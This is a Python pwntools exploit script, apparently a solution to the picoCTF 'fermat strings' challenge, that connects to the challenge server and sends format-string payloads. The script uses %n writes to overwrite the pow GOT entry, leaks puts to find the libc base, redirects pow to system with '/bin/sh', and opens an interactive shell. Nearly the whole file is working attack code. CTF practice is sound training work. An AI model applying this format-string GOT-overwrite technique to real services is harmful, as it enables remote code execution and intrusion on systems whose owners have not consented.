import pwn
from pathlib import Path

CURR_DIR = Path(__file__).parent

# Exploit steps.
# Place the address of 'pow' onto the stack - 0040084f.
# Modify the pointer to 'main's, enabling a potential leak of the system address.
# Populate the buffer with the '/bin/sh' string.
# Assign the first parameter (rdi) to the adjusted 'pow' (now representing 'system') address pointing to '/bin/sh'.
# Ignite candles and pray.

p = pwn.remote("mars.picoctf.net", 31929)
# p = pwn.remote("localhost", 8080)
# p = pwn.process('/home/dolby/repositories/crackme_challenges/fermat_strings/bin/chall')

def print_without_spaces(data):
    print("=========")
    no_spaces_string = data.replace(b" ", b"")
    print(no_spaces_string)
    return no_spaces_string

def send_data(payload):
    print_without_spaces(p.readuntil("A:"))
    p.sendline(payload)
    print_without_spaces(p.readuntil("B:"))
    p.sendline(b"1")

def send_data2(payload):
    p.sendline(payload)
    print_without_spaces(p.readuntil("B:"))
    p.sendline(b"1")

def jump_to_main():
    junk = b"29544AAA"
    debug = b"=====>____%19$s____%19$x____%17$x____%18$x"
    printf_string = "Calculating for A: "
    address_to_write = b'%' + f"{0x00400837 - (len(junk) + len(debug) + len(printf_string)) - 6}".encode('utf-8') + b'c' + b'%18$n'
    pow_at_got = pwn.p64(0x00601040)
    puts_at_got = pwn.p64(0x00601018)
    payload = [
        junk,
        debug,
        address_to_write,
        pow_at_got,
        puts_at_got
    ]
    return b"".join(payload)

def get_address_of_puts_in_plt():
    send_data(jump_to_main())
    print_without_spaces(p.readuntil("Calculating for A:"))
    all_data = print_without_spaces(p.readuntil("A:"))
    leaked_data = all_data.split(b"____")[1]
    puts_at_plt = int.from_bytes(leaked_data, "little")
    return puts_at_plt


def pow_to_system(system_at_plt, binsh_addr):
    junk = f"{binsh_addr}".encode().ljust(32, b"A")
    debug = b"=====>____%19$x____%20$x____%21$x____%22$x"
    printf_string = "Calculating for A: "
    address_to_write = b'%' + f"{system_at_plt - (len(junk) + len(debug) + len(printf_string)) + 93}".encode('utf-8') + b'c' + b'%22$n'
    pow_at_got = pwn.p64(0x00601040)
    payload = [
        junk,
        debug,
        address_to_write,
        pow_at_got
    ]
    return b"".join(payload)


def pow_to_0(system_at_plt, binsh_addr):
    junk = f"{binsh_addr}".encode().ljust(32, b"A")
    debug = b"%22$n>____%19$x____%20$x____%21$x____%22$x"
    printf_string = "Calculating for A: "
    address_to_write = b'%0c%22$x'
    pow_at_got = pwn.p64(0x00601040)
    payload = [
        junk,
        debug,
        address_to_write,
        pow_at_got
    ]
    return b"".join(payload)

puts_at_plt = get_address_of_puts_in_plt()

print("====phase 2====")
offset_of_puts_from_base = 0x71910
base = puts_at_plt - offset_of_puts_from_base
offset_of_system_from_base = 0x449c0
system_at_plt = base + offset_of_system_from_base
offset_of_binsh = 0x00181519
send_data2(pow_to_0(system_at_plt, offset_of_binsh + base))
print_without_spaces(p.readuntil("A:"))
send_data2(pow_to_system(system_at_plt, offset_of_binsh + base))
p.interactive()
